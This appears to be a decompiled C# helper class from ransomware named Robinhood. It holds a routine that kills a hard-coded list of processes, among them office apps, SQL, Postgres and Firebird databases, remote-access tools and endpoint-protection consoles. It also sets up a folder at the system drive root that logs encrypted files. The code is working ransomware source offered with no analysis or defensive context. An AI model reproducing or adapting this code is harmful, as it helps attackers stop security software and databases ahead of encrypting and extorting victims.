using System;
using System.Diagnostics;
using System.IO;

namespace Robinhood;

internal class WinHelper
{
	public static void KillProcess()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				try
				{
					Console.WriteLine(process.ProcessName);
					if (process.ProcessName.ToLower().StartsWith("notepad") || process.ProcessName.ToLower().StartsWith("excel") || process.ProcessName.ToLower() == "sql" || process.ProcessName.ToLower().StartsWith("winword") || process.ProcessName.ToLower() == "teamviewer" || process.ProcessName.ToLower().StartsWith("lks") || process.ProcessName.ToLower() == "go" || process.ProcessName.ToLower().StartsWith("taylor_made") || process.ProcessName.ToLower() == "skype" || process.ProcessName.ToLower().StartsWith("apcsystray") || process.ProcessName.ToLower() == "fbserver" || process.ProcessName.ToLower().StartsWith("anydesk") || process.ProcessName.ToLower().StartsWith("smax4pnp") || process.ProcessName.ToLower() == "fbguard" || process.ProcessName.ToLower().StartsWith("postgres") || process.ProcessName.ToLower() == "obexsrv" || process.ProcessName.ToLower().StartsWith("pg_ctl") || process.ProcessName.ToLower() == "epconsole" || process.ProcessName.ToLower().StartsWith("epag") || process.ProcessName.ToLower() == "devmonsrv" || process.ProcessName.ToLower().StartsWith("lms") || process.ProcessName.ToLower() == "uns")
					{
						process.Kill();
					}
				}
				catch (Exception ex)
				{
					WrtLg(ex.Message);
					Console.Write(ex.Message);
				}
			}
		}
		catch (Exception value)
		{
			Console.Write(value);
		}
		finally
		{
		}
	}

	public static void InitRobinhood()
	{
		try
		{
			if (!Directory.Exists(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\"))
			{
				Directory.CreateDirectory(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\");
			}
			if (!File.Exists(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\encfiles.txt"))
			{
				File.Create(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\encfiles.txt");
			}
			if (!File.Exists(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\log.txt"))
			{
				File.Create(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\log.txt");
			}
		}
		catch
		{
		}
	}

	public static void WrtLgenc(string strFile)
	{
		try
		{
			using StreamWriter streamWriter = File.AppendText(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\encfiles.txt");
			streamWriter.WriteLine(strFile);
		}
		catch (Exception)
		{
		}
	}

	public static void WrtLg(string strFile)
	{
		try
		{
			using StreamWriter streamWriter = File.AppendText(Path.GetPathRoot(Environment.SystemDirectory) + "Robinhood\\log.txt");
			streamWriter.WriteLine(strFile);
		}
		catch (Exception)
		{
		}
	}
}
